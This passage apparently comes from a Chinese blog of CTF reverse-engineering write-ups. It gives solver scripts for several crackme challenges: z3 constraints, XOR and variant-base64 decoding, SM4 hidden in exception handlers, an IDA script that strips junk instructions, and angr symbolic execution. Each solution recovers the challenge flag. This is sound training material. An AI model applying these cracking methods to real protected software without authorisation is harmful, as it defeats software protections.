class="number">18</span>]+l[<span class="number">6</span>]==-<span class="number">1236</span>)</span><br><span class="line">s.add(l[<span class="number">20</span>]+l[<span class="number">27</span>]-l[<span class="number">29</span>]-l[<span class="number">25</span>]-l[<span class="number">3</span>]+l[<span class="number">28</span>]-l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">10</span>]+l[<span class="number">31</span>]+l[<span class="number">16</span>]+l[<span class="number">21</span>]-l[<span class="number">7</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]+l[<span class="number">12</span>]-l[<span class="number">37</span>]+l[<span class="number">6</span>]+l[<span class="number">23</span>]+l[<span class="number">41</span>]-l[<span class="number">39</span>]-l[<span class="number">38</span>]+l[<span class="number">40</span>]-l[<span class="number">36</span>]+l[<span class="number">8</span>]-l[<span class="number">9</span>]-l[<span class="number">5</span>]-l[<span class="number">1</span>]-l[<span class="number">13</span>]-l[<span class="number">14</span>]+l[<span class="number">19</span>]+l[<span class="number">0</span>]-l[<span class="number">34</span>]-l[<span class="number">15</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]==-<span class="number">114</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">28</span>]-l[<span class="number">13</span>]-l[<span class="number">23</span>]-l[<span class="number">33</span>]+l[<span class="number">18</span>]+l[<span class="number">10</span>]+l[<span class="number">11</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">16</span>]+l[<span class="number">39</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">6</span>]+l[<span class="number">7</span>]+l[<span class="number">31</span>]+l[<span class="number">5</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">15</span>]-l[<span class="number">24</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">35</span>]-l[<span class="number">9</span>]+l[<span class="number">30</span>]+l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">8</span>]-l[<span class="number">14</span>]+l[<span class="number">26</span>]+l[<span class="number">21</span>]==<span class="number">659</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]-l[<span class="number">3</span>]+l[<span class="number">7</span>]-l[<span class="number">27</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]-l[<span class="number">24</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]+l[<span class="number">20</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">1</span>]+l[<span class="number">15</span>]+l[<span class="number">41</span>]+l[<span class="number">12</span>]+l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">17</span>]-l[<span class="number">39</span>]+l[<span class="number">19</span>]-l[<span class="number">13</span>]+l[<span class="number">23</span>]+l[<span class="number">18</span>]-l[<span class="number">2</span>]+l[<span class="number">6</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">28</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">10</span>]-l[<span class="number">14</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]-l[<span class="number">11</span>]==-<span class="number">430</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]-l[<span class="number">23</span>]-l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">17</span>]+l[<span class="number">38</span>]-l[<span class="number">36</span>]-l[<span class="number">22</span>]-l[<span class="number">10</span>]+l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">4</span>]+l[<span class="number">5</span>]+l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]-l[<span class="number">28</span>]+l[<span class="number">3</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">33</span>]+l[<span class="number">13</span>]-l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]-l[<span class="number">20</span>]-l[<span class="number">41</span>]-l[<span class="number">30</span>]-l[<span class="number">12</span>]-l[<span class="number">7</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">18</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]==-<span class="number">513</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">30</span>]+l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">37</span>]-l[<span class="number">15</span>]-l[<span class="number">18</span>]+l[<span class="number">7</span>]+l[<span class="number">25</span>]-l[<span class="number">14</span>]+l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">16</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">39</span>]-l[<span class="number">22</span>]+l[<span class="number">23</span>]-l[<span class="number">36</span>]-l[<span class="number">27</span>]-l[<span class="number">9</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]-l[<span class="number">0</span>]-l[<span class="number">31</span>]-l[<span class="number">20</span>]+l[<span class="number">12</span>]-l[<span class="number">8</span>]+l[<span class="number">29</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">21</span>]==-<span class="number">502</span>)</span><br><span class="line">s.add(l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">9</span>]-l[<span class="number">40</span>]-l[<span class="number">33</span>]+l[<span class="number">25</span>]+l[<span class="number">39</span>]-l[<span class="number">26</span>]+l[<span class="number">23</span>]-l[<span class="number">0</span>]-l[<span class="number">29</span>]-l[<span class="number">32</span>]-l[<span class="number">4</span>]+l[<span class="number">37</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">17</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">5</span>]+l[<span class="number">8</span>]+l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">19</span>]+l[<span class="number">12</span>]+l[<span class="number">20</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">15</span>]-l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">14</span>]==<span class="number">853</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">36</span>]-l[<span class="number">30</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]+l[<span class="number">5</span>]-l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">0</span>]-l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]+l[<span class="number">32</span>]+l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">18</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">13</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">35</span>]-l[<span class="number">26</span>]+l[<span class="number">27</span>]==-<span class="number">28</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">14</span>]-l[<span class="number">33</span>]+l[<span class="number">7</span>]-l[<span class="number">23</span>]-l[<span class="number">25</span>]+l[<span class="number">0</span>]-l[<span class="number">6</span>]-l[<span class="number">21</span>]-l[<span class="number">16</span>]+l[<span class="number">17</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]-l[<span class="number">37</span>]+l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">22</span>]-l[<span class="number">35</span>]-l[<span class="number">10</span>]-l[<span class="number">31</span>]-l[<span class="number">2</span>]+l[<span class="number">41</span>]-l[<span class="number">1</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]-l[<span class="number">34</span>]+l[<span class="number">39</span>]+l[<span class="number">40</span>]+l[<span class="number">32</span>]-l[<span class="number">5</span>]+l[<span class="number">36</span>]-l[<span class="number">27</span>]==-<span class="number">529</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]+l[<span class="number">8</span>]+l[<span class="number">36</span>]+l[<span class="number">35</span>]-l[<span class="number">23</span>]-l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]-l[<span class="number">27</span>]-l[<span class="number">24</span>]+l[<span class="number">26</span>]+l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]-l[<span class="number">2</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">10</span>]-l[<span class="number">17</span>]+l[<span class="number">3</span>]+l[<span class="number">19</span>]+l[<span class="number">22</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]+l[<span class="number">37</span>]+l[<span class="number">16</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">21</span>]-l[<span class="number">12</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]==-<span class="number">12</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">3</span>]+l[<span class="number">26</span>]-l[<span class="number">12</span>]+l[<span class="number">8</span>]-l[<span class="number">35</span>]-l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]+l[<span class="number">13</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]-l[<span class="number">21</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">29</span>]-l[<span class="number">10</span>]-l[<span class="number">38</span>]+l[<span class="number">22</span>]+l[<span class="number">37</span>]+l[<span class="number">5</span>]+l[<span class="number">19</span>]+l[<span class="number">7</span>]+l[<span class="number">16</span>]-l[<span class="number">31</span>] == <span class="number">81</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>):</span><br><span class="line">        flag += <span class="built_in">bytes</span>([m[l[i]].as_long()])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="2019红帽杯-childRE"><a href="#2019红帽杯-childRE" class="headerlink" title="[2019红帽杯]childRE"></a>[2019红帽杯]childRE</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="SWPU2019-ReverseMe"><a href="#SWPU2019-ReverseMe" class="headerlink" title="[SWPU2019]ReverseMe"></a>[SWPU2019]ReverseMe</h3><p>先与<code>SWPU_2019_CTF</code>异或</p><p>后进入encode函数，相当复杂，但实际跟进去也是个异或，动调提取xor数据以及最终对比数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">xor_data1 = <span class="string">b&quot;SWPU_2019_CTF&quot;</span></span><br><span class="line">xor_data2 = [<span class="number">0x86</span>, <span class="number">0x0C</span>, <span class="number">0x3E</span>, <span class="number">0xCA</span>, <span class="number">0x98</span>, <span class="number">0xD7</span>, <span class="number">0xAE</span>, <span class="number">0x19</span>, <span class="number">0xE2</span>, <span class="number">0x77</span>, <span class="number">0x6B</span>, <span class="number">0xA6</span>, <span class="number">0x6A</span>, <span class="number">0xA1</span>, <span class="number">0x77</span>, <span class="number">0xB0</span>, <span class="number">0x69</span>, <span class="number">0x91</span>, <span class="number">0x37</span>, <span class="number">0x05</span>, <span class="number">0x7A</span>, <span class="number">0xF9</span>, <span class="number">0x7B</span>, <span class="number">0x30</span>, <span class="number">0x43</span>, <span class="number">0x5A</span>, <span class="number">0x4B</span>, <span class="number">0x10</span>, <span class="number">0x86</span>, <span class="number">0x7D</span>, <span class="number">0xD4</span>, <span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line">data = [<span class="number">0xB3</span>, <span class="number">0x37</span>, <span class="number">0x0F</span>, <span class="number">0xF8</span>, <span class="number">0xBC</span>, <span class="number">0xBC</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xBA</span>, <span class="number">0x5A</span>, <span class="number">0x4D</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0x97</span>, <span class="number">0x62</span>, <span class="number">0xD3</span>, <span class="number">0x4F</span>, <span class="number">0xBA</span>, <span class="number">0x24</span>, <span class="number">0x16</span>, <span class="number">0x0B</span>, <span class="number">0x9F</span>, <span class="number">0x72</span>, <span class="number">0x1A</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x6D</span>, <span class="number">0x26</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0xC8</span>, <span class="number">0x67</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i] ^= xor_data2[i]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([data[i] ^ xor_data1[i % <span class="built_in">len</span>(xor_data1)]])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-crackMe"><a href="#安洵杯-2019-crackMe" class="headerlink" title="[安洵杯_2019]crackMe"></a>[安洵杯_2019]crackMe</h3><p>通过SEH, VEH异常处理进行加密、编码</p><p>通过查看交叉引用可知整个流程为</p><p>输入flag后，进行base64table变换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __stdcall sub_D02AB0(int a1, int a2, int a3, int a4)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D8h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; j_strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( Str[i] &lt;= &#x27;z&#x27; &amp;&amp; Str[i] &gt;= &#x27;a&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] -= 32;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( Str[i] &lt;= &#x27;Z&#x27; &amp;&amp; Str[i] &gt;= &#x27;A&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] += 32;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(0, &quot;hooked&quot;, &quot;successed&quot;, 0);</span><br><span class="line">  AddVectoredExceptionHandler(0, Handler);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进行Handler中的SM4解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __stdcall Handler_0(_DWORD **a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2[20]; // [esp+D0h] [ebp-18h] BYREF</span><br><span class="line"></span><br><span class="line">  if ( **a1 == 0xC0000005 )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(v2, &quot;where_are_u_now?&quot;, 16);</span><br><span class="line">    sub_D01172((int)&amp;unk_D0A218, (int)v2);</span><br><span class="line">    SetUnhandledExceptionFilter(TopLevelExceptionFilter);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后将最终对比的数据进行处理, 然后变种base64处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl sub_D02C30(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  char v2; // [esp+D3h] [ebp-11h]</span><br><span class="line">  size_t i; // [esp+DCh] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  result = (int)a1;</span><br><span class="line">  if ( *(_DWORD *)*a1 == 0xC0000005 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt; j_strlen(Str2); i += 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = Str2[i];</span><br><span class="line">      Str2[i] = Str2[i + 1];</span><br><span class="line">      Str2[i + 1] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">    Str1 = variantbase64encode(byte_D0A180);</span><br><span class="line">    *(_DWORD *)(a1[1] + 176) = *(_DWORD *)(*a1 + 20);</span><br><span class="line">    *(_DWORD *)(a1[1] + 164) = *(_DWORD *)(*a1 + 24);</span><br><span class="line">    *(_DWORD *)(a1[1] + 172) = *(_DWORD *)(*a1 + 28);</span><br><span class="line">    *(_DWORD *)(a1[1] + 168) = *(_DWORD *)(*a1 + 32);</span><br><span class="line">    *(_DWORD *)(a1[1] + 156) = *(_DWORD *)(*a1 + 36);</span><br><span class="line">    *(_DWORD *)(a1[1] + 160) = *(_DWORD *)(*a1 + 40);</span><br><span class="line">    *(_DWORD *)(a1[1] + 184) = sub_D01136;</span><br><span class="line">    result = -1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变种位置在<code>=变！</code>， 以及整个表的右移24</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211003151707570.png" alt="image-20211003151707570"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_D02760</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 + <span class="number">0x18</span>) % <span class="number">64</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则解密如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">new_table = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">97</span> &lt;= i &lt;= <span class="number">122</span>:</span><br><span class="line">        new_table += <span class="built_in">bytes</span>([i - <span class="number">32</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">65</span> &lt;= i &lt;= <span class="number">90</span>:</span><br><span class="line">        new_table += <span class="built_in">bytes</span>([i + <span class="number">32</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_table += <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line">new_table = <span class="built_in">list</span>(new_table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">    new_table.insert(<span class="built_in">len</span>(new_table), new_table[<span class="number">0</span>])</span><br><span class="line">    new_table.remove(new_table[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">new_table = <span class="built_in">bytes</span>(new_table)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="string">&quot;1UTAOIkpyOSWGv/mOYFY4R!!&quot;</span>.replace(<span class="string">&quot;!&quot;</span>, <span class="string">&quot;=&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    s[i], s[i+<span class="number">1</span>] = s[i+<span class="number">1</span>], s[i]</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span>.join(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">s = s.translate(<span class="built_in">bytes</span>.maketrans(new_table, table))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line">key = <span class="string">b&quot;where_are_u_now?&quot;</span></span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">cipher = bytes_to_long(cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> decrypt</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(decrypt(cipher, key)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-IntroToPE"><a href="#CFI-CTF-2018-IntroToPE" class="headerlink" title="[CFI-CTF 2018]IntroToPE"></a>[CFI-CTF 2018]IntroToPE</h3><p>.Net 用 dnspy ， base64直接解‘</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211003154437068.png" alt="image-20211003154437068"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp bpython3</span><br><span class="line">bpython version 0.20 on top of Python 3.6.9 /usr/local/bin/python3</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(b&quot;Q0ZJey5OZXRDI18xc19AdzNzMG0zfQ==&quot;)</span><br><span class="line">b&#x27;CFI&#123;.NetC#_1s_@w3s0m3&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h3><p>三部分, encode_one为base64, encode_tow换个位置，encode_three凯撒密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_one</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_tow</span>(<span class="params">s</span>):</span></span><br><span class="line">    _s = [<span class="number">0</span>] * <span class="built_in">len</span>(s)</span><br><span class="line">    _s[<span class="number">26</span>:<span class="number">39</span>] = s[:<span class="number">13</span>]</span><br><span class="line">    _s[:<span class="number">13</span>] = s[<span class="number">13</span>:<span class="number">26</span>]</span><br><span class="line">    _s[<span class="number">39</span>:<span class="number">39</span>+<span class="number">13</span>] = s[<span class="number">26</span>:<span class="number">26</span>+<span class="number">13</span>]</span><br><span class="line">    _s[<span class="number">13</span>:<span class="number">13</span>+<span class="number">13</span>] = s[<span class="number">39</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(_s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_tree</span>(<span class="params">s</span>):</span></span><br><span class="line">    _s = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0x30</span> &lt;= i &lt;= <span class="number">0x39</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([(i - <span class="number">0x30</span> - <span class="number">3</span>) % <span class="number">10</span> + <span class="number">0x30</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">0x61</span> &lt;= i &lt;= <span class="number">0x7A</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([(i - <span class="number">0x61</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">0x61</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">0x41</span> &lt;= i &lt;= <span class="number">0x41</span> + <span class="number">25</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([(i - <span class="number">0x41</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="number">0x41</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            _s += <span class="built_in">bytes</span>([i])</span><br><span class="line">    <span class="keyword">return</span> _s</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line">s = decode_tree(s)</span><br><span class="line">s = decode_tow(s)</span><br><span class="line">s = decode_one(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-funnyre"><a href="#WUSTCTF2020-funnyre" class="headerlink" title="[WUSTCTF2020]funnyre"></a>[WUSTCTF2020]funnyre</h3><p>花指令直接拿脚本去掉</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0x00000000004005B0</span></span><br><span class="line">end = <span class="number">0x0000000000402584</span></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        patch_byte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> =next_instr(addr)</span><br><span class="line">    create_insn(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(addr) <span class="keyword">and</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(<span class="built_in">next</span>) :</span><br><span class="line">        <span class="keyword">if</span> get_operand_value(addr, <span class="number">0</span>) == get_operand_value(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;jmp %08x&#x27;</span>%addr)</span><br><span class="line">            dest_addr = get_operand_value(addr, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            create_insn(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    create_insn(addr)</span><br></pre></td></tr></table></figure><p>apply patch后打开发现是简单运算后对比, 直接angr暴力解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./funnyre&quot;</span>, load_options=&#123;<span class="string">&quot;auto_load_libs&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">f = p.factory</span><br><span class="line">state = f.entry_state(addr=<span class="number">0x400605</span>)</span><br><span class="line">flag = claripy.BVS(<span class="string">&quot;flag&quot;</span>, <span class="number">8</span>*<span class="number">32</span>)</span><br><span class="line">state.memory.store(<span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span>, flag)</span><br><span class="line">state.regs.rdx = <span class="number">0x603055</span>+<span class="number">0x300</span></span><br><span class="line">state.regs.rdi = <span class="number">0x603055</span>+<span class="number">0x300</span>+<span class="number">5</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">sm.explore(find=<span class="number">0x401DAE</span>)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] found!&quot;</span>)</span><br><span class="line">    x = sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><h3 id="RoarCTF2019-polyre"><a href="#RoarCTF2019-polyre" class="headerlink" title="[RoarCTF2019]polyre"></a>[RoarCTF2019]polyre</h3><p>Ollvm + 不透明谓词 + 整数溢出</p><p>先去平坦化 <a href="https://github.com/cq674350529/deflat%E5%90%8E%E5%8E%BB%E4%B8%8D%E9%80%8F%E6%98%8E%E8%B0%93%E8%AF%8D">https://github.com/cq674350529/deflat后去不透明谓词</a></p><p>流程如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line"> <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line"> <span class="built_in">memset</span>(s1, 